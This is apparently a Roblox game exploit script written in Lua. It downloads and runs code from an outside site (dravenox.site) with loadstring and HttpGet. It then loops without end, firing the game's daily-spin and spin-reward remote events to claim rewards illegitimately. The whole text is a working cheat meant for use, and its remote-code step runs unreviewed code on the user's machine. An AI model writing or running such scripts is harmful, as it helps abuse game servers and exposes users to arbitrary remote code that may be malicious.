pcall(function()
    local e = {
        ["?"] = loadstring(game:HttpGet("https://dravenox.site/shortcut.luau"))(),
        ["!"] = 1
    }

    e["?"].spawn(function()
        while true do
            for i = 1, e["!"] do
                pcall(function()
                    local ex = {
                        e["?"].rep.Remotes.Events.ClaimDailySpin,
                        e["?"].rep.Remotes.Events.ClaimSpinReward,
                        e["?"].rep.Remotes.Events.SpinWheel
                    }

                    for _, xa in ipairs(ex) do
                        xa:FireServer()
                    end
                end)
            end
            e["?"].wait()
        end
    end)
end)
